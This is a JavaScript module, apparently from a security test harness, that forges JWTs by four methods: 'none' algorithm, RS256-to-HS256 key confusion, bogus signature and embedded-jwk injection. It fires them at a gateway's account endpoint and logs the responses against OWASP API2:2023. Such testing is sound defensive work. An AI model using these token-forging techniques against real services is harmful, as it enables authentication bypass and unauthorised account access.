const crypto = require('crypto');
const { authedGet, sleep } = require('../lib/httpClient');
const { R2_ATTACKER_IP } = require('../lib/config');

const DEFAULT_PUBLIC_KEY_B64 =
  'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwWGJsSDNUTnpIaUQvY09zSUdaKwpQVmRJd0xZanNNQi9ITUlrTFNvSCttazRHeUpHVnp5a1BLeFJ1S2hlSllUaXFqbVlQaHFkTlBPdXNzUzRJdHRvCjNUbERvdkpTNDU3aFg2WVdmcS9VNHBubDYwN0hyWURBSUxpMWluTnVGRnpXbTRaK0tLMW5ISzVCc1JadXl3TGkKeEpSS210bks5TlMzeWVpa2p2SVNjNXNXOEZTdG8xNjQvSnRXZFNKYzltdDJ0WS9HZlh0bitTOTVtZVBJK3psaQp6cWwwb0pQQkt6b05nb1Rvem02eCt3aGozVk9xeUVFUTJBbk9pWGNHenp0dVJJZ3BpRlBRQmR3bzc5RU8wVEk2CjhndmFVVnRreFgxdVg1eEdpZGR4U0NkNTROMjJxQlZJTGdrbk5sdnQwcTRoRnZNSDcxZHNaY0R2WTl0bVFIc20Kb1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==';

function base64url(input) {
  return Buffer.from(input).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function craftNoneAlgToken(claims) {
  const header = base64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  const payload = base64url(JSON.stringify(claims));
  return `${header}.${payload}.`;
}

function craftConfusionToken(claims, publicKeyPem) {
  const header = base64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = base64url(JSON.stringify(claims));
  const signature = crypto.createHmac('sha256', publicKeyPem).update(`${header}.${payload}`).digest('base64url');
  return `${header}.${payload}.${signature}`;
}

function craftForgedSignatureToken(claims) {
  const header = base64url(JSON.stringify({ alg: 'RS256', typ: 'JWT' }));
  const payload = base64url(JSON.stringify(claims));
  const bogusSignature = base64url(crypto.randomBytes(256).toString('base64'));
  return `${header}.${payload}.${bogusSignature}`;
}

function craftJwkInjectionToken(claims) {
  // Embeds a self-generated key in the header and signs with its own
  // private half, hoping a vulnerable verifier trusts an embedded `jwk`
  // instead of its own pinned key - gateway/src/security/jwt.js never
  // reads the header at all, so this is rejected the same way as the rest.
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const header = base64url(JSON.stringify({ alg: 'RS256', typ: 'JWT', jwk }));
  const payload = base64url(JSON.stringify(claims));
  const signature = crypto.sign('RSA-SHA256', Buffer.from(`${header}.${payload}`), privateKey).toString('base64url');
  return `${header}.${payload}.${signature}`;
}

function buildAttackTokens() {
  const now = Math.floor(Date.now() / 1000);
  const claims = { sub: '1', email: 'alice@example.com', iat: now, exp: now + 900 };
  const publicKeyPem = Buffer.from(process.env.GATEWAY_JWT_PUBLIC_KEY_B64 || DEFAULT_PUBLIC_KEY_B64, 'base64').toString('utf8');

  return [
    { technique: 'none_alg', token: craftNoneAlgToken(claims) },
    { technique: 'alg_confusion_rs256_to_hs256', token: craftConfusionToken(claims, publicKeyPem) },
    { technique: 'forged_signature', token: craftForgedSignatureToken(claims) },
    { technique: 'jwk_injection', token: craftJwkInjectionToken(claims) },
  ];
}

async function runJwtManipulation(baseUrl, { repeats = 5, requestsPerSecond = 5 } = {}) {
  const intervalMs = 1000 / requestsPerSecond;
  const observations = [];
  const techniques = buildAttackTokens();

  for (let i = 0; i < repeats; i++) {
    for (const { technique, token } of techniques) {
      const obs = await authedGet(`${baseUrl}/api/accounts/1`, token, R2_ATTACKER_IP);
      obs.technique = technique;
      observations.push(obs);
      await sleep(intervalMs);
    }
  }

  return { category: 'jwt_manipulation', ruleRef: 'R2', owaspRef: 'API2:2023', observations };
}

module.exports = { runJwtManipulation, buildAttackTokens };
